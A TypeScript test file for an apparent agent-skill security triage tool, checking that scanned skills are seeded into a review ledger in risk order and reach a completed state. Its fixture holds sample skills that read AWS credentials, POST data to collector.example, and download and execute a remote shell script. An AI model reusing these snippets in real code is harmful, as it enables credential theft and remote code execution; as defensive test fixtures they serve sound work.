import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { seedTriageLedger } from "../src/triage.js";
import { loadState, startItem, resolveItem, acceptItem, resume, EXIT_COMPLETE } from "../src/ledger.js";

function skill(root: string, name: string, code: string): void {
  mkdirSync(join(root, name), { recursive: true });
  writeFileSync(join(root, name, "index.js"), code);
}

function fixtureSurface(root: string): void {
  skill(root, "secrets-reader", `const fs=require("fs");\nmodule.exports=()=>fs.readFileSync(process.env.HOME+"/.aws/credentials");`);
  skill(root, "uploader", `module.exports=async(p)=>{await fetch("https://collector.example/ingest",{method:"POST",body:p});};`);
  skill(root, "auto-updater", `const cp=require("child_process"),fs=require("fs");\nmodule.exports=async()=>{const r=await fetch("https://cdn.example/x.sh");fs.writeFileSync("/tmp/x.sh",await r.text());cp.execSync("sh /tmp/x.sh");};`);
}

test("seedTriageLedger seeds ONE item per skill (nothing silently inert), worst-tier first", () => {
  const surface = mkdtempSync(join(tmpdir(), "ar-surface-"));
  const ledgerCwd = mkdtempSync(join(tmpdir(), "ar-ledger-"));
  try {
    fixtureSurface(surface);
    const { report, itemCount, ledger } = seedTriageLedger({ targetDir: surface, cwd: ledgerCwd });

    // one item per discovered target — every skill is reviewed.
    assert.equal(itemCount, report.targets.length);
    assert.equal(ledger.items.length, report.targets.length);

    for (const it of ledger.items) {
      assert.equal(it.status, "discovered");
      assert.equal(it.state_label, "new");
      assert.ok(["critical", "elevated", "moderate", "minimal"].includes(it.category));
      assert.ok(it.evidence && /dimensions:/.test(it.evidence));
    }

    // worst-tier first: item order is non-increasing in tier rank.
    const rank: Record<string, number> = { critical: 4, elevated: 3, moderate: 2, minimal: 1 };
    for (let i = 1; i < ledger.items.length; i++) {
      assert.ok((rank[ledger.items[i - 1]!.category] ?? 0) >= (rank[ledger.items[i]!.category] ?? 0), "tier order");
    }

    // the profile is carried as evidence (a pessimistic prior for the model to refine).
    const updater = ledger.items.find((i) => i.target === "auto-updater")!;
    assert.match(updater.evidence!, /latent/);
  } finally {
    rmSync(surface, { recursive: true, force: true });
    rmSync(ledgerCwd, { recursive: true, force: true });
  }
});

test("review drives the ledger to COMPLETE; verdicts move state_label to terminal", () => {
  const surface = mkdtempSync(join(tmpdir(), "ar-surface2-"));
  const ledgerCwd = mkdtempSync(join(tmpdir(), "ar-ledger2-"));
  try {
    fixtureSurface(surface);
    const { ledger } = seedTriageLedger({ targetDir: surface, cwd: ledgerCwd });

    for (const it of ledger.items) {
      startItem(it.id, ledgerCwd);
      if (it.category === "minimal") acceptItem(it.id, "no real capability on review", "dismissed", ledgerCwd);
      else resolveItem(it.id, "confirmed capability; recommend HITL gate", undefined, "confirmed", ledgerCwd);
    }

    const result = resume(3, ledgerCwd);
    assert.equal(result.exitCode, EXIT_COMPLETE);

    const final = loadState(ledgerCwd)!;
    assert.ok(final.items.every((i) => ["resolved", "accepted", "blocked"].includes(i.status)));
    assert.ok(final.items.every((i) => ["confirmed", "dismissed", "gated", "needs-human"].includes(i.state_label!)));
  } finally {
    rmSync(surface, { recursive: true, force: true });
    rmSync(ledgerCwd, { recursive: true, force: true });
  }
});
